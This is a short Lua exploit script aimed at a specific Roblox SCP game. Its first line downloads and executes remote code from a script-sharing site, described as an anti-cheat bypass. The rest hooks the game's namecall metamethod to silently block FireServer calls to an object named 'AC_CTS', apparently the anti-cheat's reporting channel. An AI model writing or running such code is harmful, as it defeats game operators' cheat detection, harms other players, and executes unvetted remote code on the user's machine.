-- for https://www.roblox.com/games/6495459333/SCP-049-SCP-Demonstration#!/game-instances

loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Adonis-actul-bypass-20697"))();
local hook;

hook = hookmetamethod(game, "__namecall", newcclosure(function(Self, ...)
    local args = {...};
    local ncm = getnamecallmethod();
    if typeof(Self) == "Instance" and Self.Name == "AC_CTS" and ncm == "FireServer" then
        return;
    end;
    return hook(Self, ...);
end));
